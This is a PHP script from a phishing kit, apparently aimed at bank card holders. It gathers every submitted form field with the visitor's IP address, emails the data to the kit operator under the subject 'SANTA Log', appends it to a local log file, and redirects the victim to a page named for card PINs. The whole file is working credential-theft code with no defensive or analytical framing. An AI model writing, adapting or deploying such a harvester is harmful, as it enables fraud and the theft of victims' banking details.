<?php
include '../mail.php';
session_start();
$ip = getenv("REMOTE_ADDR");

$postdata="";
foreach ($_POST as $key => $value){
		$postdata .= htmlspecialchars($key)."=".htmlspecialchars($value)."<br>";
}	
$_SESSION['log']=$postdata;

	

$message .= "#".  date('H:i:s')."#$ip\n";
$message .= "| IP : $ip ------------------\n";
$message .= "$postdata\n";
$message .= "| Th3 MasT3r Z------------------\n";

$subject = "| SANTA Log | $ip |";
$from = "From: TMZ <tmz@localhost.com>";
mail($send,$subject,$message,$from);

$file = fopen("../../bella.txt", 'a');
fwrite($file, $message);


echo "<script>window.top.location.href = \"tarjetaspin.html?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."\"; </script>";

?>
}
